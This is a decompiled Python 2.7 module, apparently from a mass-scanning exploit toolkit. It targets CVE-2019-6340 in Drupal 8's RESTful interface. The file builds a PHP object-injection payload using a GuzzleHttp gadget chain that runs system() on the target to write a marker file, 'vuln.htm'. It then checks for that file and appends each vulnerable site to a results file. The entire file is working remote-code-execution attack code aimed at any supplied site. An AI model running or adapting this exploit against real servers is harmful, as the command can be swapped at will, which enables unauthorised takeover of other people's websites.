# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\CVE_2019_6340Drupal8RESTful.py
import requests
from Exploits import printModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

def Exploit(site):
    flaga = False
    for Node in range(15):
        if Node == 0:
            Node += 1
        headers = {'Content-Type': 'application/hal+json','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'
           }
        try:
            cmd = "echo 'Vuln!! patch it Now!' > vuln.htm"
            Data = '{\n                "_links": {\n                  "type": { "href": "http://%s/rest/type/shortcut/default"}\n                },\n                "link": [\n                  {\n                    "options": "O:24:\\"GuzzleHttp\\\\Psr7\\\\FnStream\\":2:{s:33:\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\";a:1:{s:5:\\"close\\";a:2:{i:0;O:23:\\"GuzzleHttp\\\\HandlerStack\\":3:{s:32:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\";s:%d:\\"%s\\";s:30:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\";a:1:{i:0;a:1:{i:0;s:%d:\\"%s\\";}}s:31:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\";b:0;}i:1;s:7:\\"resolve\\";}}s:9:\\"_fn_close\\";a:2:{i:0;r:4;i:1;s:7:\\"resolve\\";}}",\n                    "value": "link"\n                  }\n                ]\n              }' % (site, len(cmd), cmd, len('system'), 'system')
            try:
                requests.get('http://{}{}'.format(site, '/node/{}?_format=hal_json'.format(str(Node))), data=Data, headers=headers, timeout=10)
                CheckINDEX = requests.get('http://{}/vuln.htm'.format(site), timeout=10, headers=Headers)
                if 'Vuln!! patch it Now!' in str(CheckINDEX.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/vuln.htm' + '\n')
                    flaga = True
                    break
            except:
                pass

        except:
            pass

    if flaga == True:
        return printModule.returnYes(site, 'CVE-2019-6340', 'Drupal 8 RESTful', 'Drupal')
    else:
        return printModule.returnNo(site, 'CVE-2019-6340', 'Drupal 8 RESTful', 'Drupal')